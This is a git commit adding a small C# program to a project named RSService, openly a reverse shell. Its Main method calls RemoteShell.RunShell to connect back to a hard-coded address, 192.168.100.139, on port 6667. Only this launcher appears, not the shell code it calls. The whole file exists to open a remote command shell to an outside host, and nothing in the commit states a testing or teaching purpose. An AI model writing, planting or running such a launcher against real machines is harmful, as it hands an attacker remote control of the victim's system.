f83cd0b1986da84ef63d0dd21b0dc2a70c3c3c8f
suchmememanyskill <38142618+suchmememanyskill@users.noreply.github.com>
2021-10-06 09:28:07 +0200

    Add RSService (#11)
    Co-authored-by: suchmememanyskill <suchmememanyskill@users.noreply.github.com>

---
+++ RSService/ReverseShellApplication/Program.cs
@@ -0,0 +1,17 @@
+﻿using ReverseShellService;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace ReverseShellApplication
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            RemoteShell.RunShell("192.168.100.139", 6667);
+        }
+    }
+}
